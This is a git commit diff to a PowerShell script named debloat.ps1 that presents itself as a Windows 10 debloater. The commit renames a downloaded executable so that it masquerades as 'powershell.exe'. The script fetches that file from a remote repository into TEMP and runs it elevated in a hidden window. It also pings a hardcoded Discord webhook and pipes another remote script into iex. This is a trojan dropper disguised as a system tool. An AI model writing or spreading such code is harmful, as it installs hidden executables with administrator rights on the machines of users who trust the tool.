d88d3d85ae6c823d0272519a1772b2cc5ca90e85
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-14 22:26:15 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,4 +1,4 @@
-iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/plug-anal.exe" -o $env:TEMP\plug-anal.exe
+iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/powershell.exe" -o $env:TEMP\powershell.exe
 
 $hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
 $Body = @{
@@ -6,5 +6,5 @@ $Body = @{
 }
 Invoke-RestMethod -useb -Uri $hookUrl -Method 'post' -Body $Body
 
-Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\plug-anal.exe
+Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\powershell.exe
 iwr -useb git.io/debloat|iex
